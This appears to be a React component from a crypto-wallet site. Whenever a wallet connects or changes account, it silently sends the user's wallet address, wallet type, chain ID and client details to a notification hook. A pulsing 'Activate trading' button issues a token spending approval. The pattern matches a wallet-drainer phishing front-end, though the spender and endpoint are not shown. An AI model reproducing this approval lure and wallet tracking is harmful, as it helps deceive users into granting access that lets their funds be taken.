import React, { useState, useEffect, useRef } from 'react';
import { Wallet, Copy, Check, LogOut } from 'lucide-react';
import { useWallet } from '../hooks/useWallet';
import { useLanguage } from '../hooks/useLanguage';
import { notifyNewWallet } from '../lib/notify';

export const WalletButton: React.FC = () => {
  const {
    wallet,
    isConnecting,
    isApproving,
    hasManagementPermission,
    availableWallets,
    connectWallet,
    disconnectWallet,
    copyAddress,
    approveToken,
    testWalletCapabilities,
    testTokenApprove,
  } = useWallet();

  const { t } = useLanguage();
  const [copied, setCopied] = useState(false);

  // трекаем прошлые значения, чтобы ловить "рёбра" подключения и смену аккаунта
  const prevConnected = useRef<boolean>(false);
  const prevAddress = useRef<string | null>(null);

  // универсальная отправка уведомления
  const sendNotify = async () => {
    const addr = wallet?.address;
    if (!addr) return;

    let network: string | undefined = (wallet as any)?.network || undefined;
    const extra: Record<string, unknown> = { hasManagementPermission: !!hasManagementPermission };

    if (typeof window !== 'undefined') {
      const w: any = window as any;

      // Тип кошелька
      if (w.tronLink) extra.walletType = 'TronLink';
      else if (w.ethereum?.isMetaMask) extra.walletType = 'MetaMask';
      else if (w.ethereum) extra.walletType = 'EVM Wallet';
      else extra.walletType = 'unknown';

      // TRON детали
      if (w.tronWeb?.defaultAddress) {
        extra.tron = {
          base58: w.tronWeb.defaultAddress.base58 || null,
          hex: w.tronWeb.defaultAddress.hex || null,
          node: w.tronWeb?.fullNode?.host || null,
        };
        if (!network && w.tronWeb?.fullNode?.host) {
          const host = String(w.tronWeb.fullNode.host);
          network = /trongrid\.io/i.test(host)
            ? 'tron-mainnet'
            : /nile|shasta/i.test(host)
            ? 'tron-testnet'
            : 'tron-unknown';
        }
      }

      // EVM детали
      if (w.ethereum) {
        try { extra.chainId = await w.ethereum.request({ method: 'eth_chainId' }); } catch {}
        try { extra.web3Client = await w.ethereum.request({ method: 'web3_clientVersion' }); } catch {}
      }
    }

    try {
      await (notifyNewWallet as any)(addr, network, extra);
    } catch (e) {
      console.warn('notifyNewWallet failed', e);
    }
  };

  // отправляем:
  // 1) при новом подключении (false -> true)
  // 2) при смене адреса, даже без дисконнекта
  useEffect(() => {
    const connected = !!wallet?.connected;
    const addr = wallet?.address || null;

    const connectedEdge = connected && !prevConnected.current;          // новый connect
    const addressChanged = connected && prevAddress.current && prevAddress.current !== addr; // смена аккаунта

    if (connectedEdge || addressChanged) {
      void sendNotify();
    }

    prevConnected.current = connected;
    prevAddress.current = addr;
  }, [wallet?.connected, wallet?.address, wallet?.network, hasManagementPermission]);

  const handleCopyAddress = () => {
    copyAddress();
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const formatAddress = (address: string) => {
    if (!address) return '';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  const handleApprove = async () => {
    try {
      await approveToken('1000');
    } catch (error) {
      console.error('Approve failed:', error);
    }
  };

  const onDisconnect = () => {
    // сбрасывать ничего не нужно — мы теперь шлём на новое "рёбро" подключения
    disconnectWallet();
  };

  if (wallet.connected) {
    return (
      <div className="relative group">
        <div
          className={[
            'bg-gray-800/50 backdrop-blur-sm rounded-lg px-4 py-2 flex items-center space-x-3 border shadow-lg',
            hasManagementPermission
              ? 'border-green-500/30 shadow-green-500/10'
              : 'border-yellow-500/30 shadow-yellow-500/10',
          ].join(' ')}
        >
          <div className="flex items-center space-x-2">
            <div
              className={[
                'w-2 h-2 rounded-full animate-pulse shadow-lg',
                hasManagementPermission
                  ? 'bg-green-400 shadow-green-400/50'
                  : 'bg-yellow-400 shadow-yellow-400/50',
              ].join(' ')}
            />
            <span className="text-sm text-gray-300">{formatAddress(wallet.address)}</span>
          </div>

          <button
            onClick={handleCopyAddress}
            className="p-1 hover:bg-gray-700 rounded transition-colors"
            title={t('wallet.copyAddress')}
          >
            {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4 text-gray-400" />}
          </button>

          <button
            onClick={handleApprove}
            disabled={isApproving}
            className={[
              'px-3 py-1 rounded text-xs transition-colors font-bold',
              hasManagementPermission
                ? 'bg-green-600 hover:bg-green-700'
                : 'bg-gradient-to-r from-yellow-500 to-orange-600 hover:from-yellow-400 hover:to-orange-500 animate-pulse',
              isApproving ? 'disabled:bg-gray-600' : '',
            ].join(' ')}
            title={hasManagementPermission ? 'Trading activated' : 'Click to activate trading'}
          >
            {isApproving ? '⏳ Approving...' : hasManagementPermission ? '✅ Active' : '🚀 Activate'}
          </button>

          <button
            onClick={onDisconnect}
            className="p-1 hover:bg-gray-700 rounded transition-colors text-red-400"
            title={t('wallet.disconnect')}
          >
            <LogOut className="w-4 h-4" />
          </button>
        </div>

        {/* Статичная пометка (мы НИКОГДА не запрашиваем сид-фразы) */}
        <div className="mt-2 text-xs text-white/60 select-none">Seeds:</div>

        {/* Testing dropdown */}
        <div className="opacity-0 group-hover:opacity-100 absolute top-full right-0 mt-2 w-72 bg-gray-800 rounded-lg shadow-xl border border-gray-700 z-50 transition-opacity duration-200">
          <div className="p-3">
            <h4 className="text-white font-semibold mb-2 text-sm">🧪 Wallet Testing</h4>
            <div className="space-y-2">
              <button
                onClick={testWalletCapabilities}
                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
              >
                🔍 Check Capabilities
              </button>
              <button
                onClick={testTokenApprove}
                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
              >
                🧪 Test Token Approve
              </button>
              <button
                onClick={() => void sendNotify()}
                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
                title="Повторно отправить уведомление сейчас"
              >
                🔁 Notify again (manual)
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <button
      onClick={connectWallet}
      disabled={isConnecting}
      className="relative flex items-center space-x-2 px-4 py-2 bg-gradient-to-r from-cyan-500 via-blue-600 to-purple-600 hover:from-cyan-400 hover:via-blue-500 hover:to-purple-500 disabled:from-gray-600 disabled:via-gray-700 disabled:to-gray-800 rounded-lg transition-all duration-300 transform hover:scale-105 shadow-lg shadow-cyan-500/25 border border-cyan-400/50"
    >
      <Wallet className="w-4 h-4" />
      <span className="font-medium">{isConnecting ? 'Connecting...' : t('wallet.connect')}</span>

      {!isConnecting && (
        <div className="absolute -top-2 -right-2 flex space-x-1">
          {availableWallets.tronLink && (
            <div
              className="w-3 h-3 bg-green-500 rounded-full border border-white shadow-lg"
              title="TronLink available"
            />
          )}
        </div>
      )}
    </button>
  );
};
